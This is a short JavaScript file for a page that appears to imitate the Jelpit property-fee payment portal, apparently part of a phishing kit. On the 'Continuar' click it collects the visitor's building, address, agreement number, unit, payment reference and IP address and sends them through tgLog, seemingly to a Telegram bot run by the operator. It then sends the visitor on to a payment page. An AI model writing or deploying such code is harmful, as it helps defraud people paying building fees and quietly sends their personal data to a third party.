/* ── Load data from sessionStorage ──────────────────────── */
const conj = JSON.parse(sessionStorage.getItem('jelpit_conj') || 'null');
const apt  = JSON.parse(sessionStorage.getItem('jelpit_apt')  || 'null');

if (!conj || !apt) {
  window.location.replace('index.php');
}

/* ── Render data ────────────────────────────────────────── */
if (conj) {
  document.getElementById('valNombreCopropiedad').textContent = conj.co_ownership_name || '';

  const city = [conj.city, conj.department].filter(Boolean).join(' - ');
  const addressEl = document.getElementById('valDireccionCopropiedad');
  if (conj.address && city) {
    addressEl.innerHTML = `${conj.address}, <strong>${city}</strong>`;
  } else {
    addressEl.textContent = conj.address || city || '';
  }

  document.getElementById('valConvenio').innerHTML =
    `<strong>Convenio:</strong> ${conj.agreement_number || ''}`;
}

if (apt) {
  document.getElementById('valInmueble').textContent  = `Inmueble : ${apt.tipo || 'INMUEBLE'} ${apt.inmueble}`;
  document.getElementById('valReferencia').textContent = `Referencia : ${apt.referencia}`;
}

/* ── Cambiar copropiedad ────────────────────────────────── */
document.getElementById('cambiarConj').addEventListener('click', e => {
  e.preventDefault();
  sessionStorage.removeItem('jelpit_conj');
  sessionStorage.removeItem('jelpit_apt');
  window.location.href = 'index.php';
});

/* ── Cambiar referencia (keeps conjunto) ────────────────── */
document.getElementById('cambiarRef').addEventListener('click', e => {
  e.preventDefault();
  sessionStorage.setItem('jelpit_keep_conj', '1');
  window.location.href = 'index.php';
});

/* ── Continuar → pagar.php ─────────────────────────────── */
const btnContinuar = document.getElementById('btnContinuarVerificar');
const loader       = document.getElementById('pagarAdminLoader');

btnContinuar && btnContinuar.addEventListener('click', () => {
  tgGetIP().then(ip => tgLog([
    '✅ <b>VERIFICAR → CONTINUAR</b>',
    `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
    `📍 Dirección: ${conj?.address || '—'}, ${conj?.city || '—'}`,
    `🔑 Convenio: ${conj?.agreement_number || '—'}`,
    `🚪 Inmueble: ${apt?.tipo || ''} ${apt?.inmueble || '—'}`,
    `🔖 Referencia: ${apt?.referencia || '—'}`,
    `🌐 IP: <code>${ip}</code>`,
    `🕐 ${new Date().toLocaleString('es-CO')}`
  ]));
  if (loader) {
    loader.classList.add('is-visible');
    loader.setAttribute('aria-busy', 'true');
  }
  setTimeout(() => { window.location.href = 'pagar.php'; }, 800);
});

/* ── Promo carousel ─────────────────────────────────────── */
(function () {
  const inner  = document.getElementById('promoBannerInner');
  if (!inner) return;
  const slides = inner.querySelectorAll('.promo-slide');
  if (slides.length < 2) return;
  let current = 0;
  function goTo(n) {
    current = ((n % slides.length) + slides.length) % slides.length;
    inner.style.transform = `translateX(-${current * 100}%)`;
  }
  goTo(0);
  setInterval(() => goTo(current + 1), 5000);
})();
